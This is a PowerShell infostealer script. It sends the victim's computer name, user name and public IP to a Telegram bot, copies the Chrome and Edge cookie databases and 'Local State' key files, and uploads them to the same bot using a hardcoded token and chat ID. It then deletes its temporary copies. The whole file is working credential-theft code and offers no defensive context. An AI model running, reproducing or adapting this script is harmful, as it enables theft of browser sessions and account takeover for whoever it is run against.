# steal_debug_send.ps1
# Sends any file found in the temp folder – no renaming

$t = "8940444810:AAHeKIwsLgAI2o7H20984vi_1K-yEI2J3k8"
$c = "6760965981"
$base = "https://api.telegram.org/bot$t"

# --- PC INFO ---
$h = $env:COMPUTERNAME
$us = $env:USERNAME
$ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
$body = @{ chat_id = $c; text = "PC: $h | User: $us | IP: $ip" }
Invoke-RestMethod -Uri "$base/sendMessage" -Method Post -Body $body

# --- TEMP FOLDER ---
$temp_dir = "$env:TEMP\steal_tg"
New-Item -ItemType Directory -Force -Path $temp_dir | Out-Null

# --- COPY FILES DIRECTLY (no rename) ---
$src_edges = @(
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
)
$src_chrome = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
)

# Copy Edge files
foreach ($src in $src_edges) {
    if (Test-Path $src) {
        $name = Split-Path $src -Leaf
        $dst = "$temp_dir\Edge_$name"
        robocopy (Split-Path $src) $temp_dir $name /B /R:1 /W:1 /NFL /NDL /NJH /NJS | Out-Null
        # If robocopy succeeded, the file is in temp_dir with original name
    }
}

# Copy Chrome files
foreach ($src in $src_chrome) {
    if (Test-Path $src) {
        $name = Split-Path $src -Leaf
        $dst = "$temp_dir\Chrome_$name"
        robocopy (Split-Path $src) $temp_dir $name /B /R:1 /W:1 /NFL /NDL /NJH /NJS | Out-Null
    }
}

# --- SEND EVERY FILE IN TEMP FOLDER ---
$files = Get-ChildItem -Path $temp_dir -File
$sent = 0
foreach ($f in $files) {
    $uri = "$base/sendDocument?chat_id=$c"
    try {
        Invoke-RestMethod -Uri $uri -Method Post -InFile $f.FullName -ContentType "application/octet-stream" -ErrorAction Stop
        $sent++
        # Send a confirmation for each file
        $msg = @{ chat_id = $c; text = "Sent: $($f.Name)" }
        Invoke-RestMethod -Uri "$base/sendMessage" -Method Post -Body $msg -ErrorAction SilentlyContinue
    } catch {
        # Log error
        $err = @{ chat_id = $c; text = "Failed to send $($f.Name): $_" }
        Invoke-RestMethod -Uri "$base/sendMessage" -Method Post -Body $err -ErrorAction SilentlyContinue
    }
    Remove-Item $f.FullName -Force -ErrorAction SilentlyContinue
}

# --- STATUS ---
$status = "Sent $sent of $($files.Count) files from $temp_dir"
$body = @{ chat_id = $c; text = $status }
Invoke-RestMethod -Uri "$base/sendMessage" -Method Post -Body $body
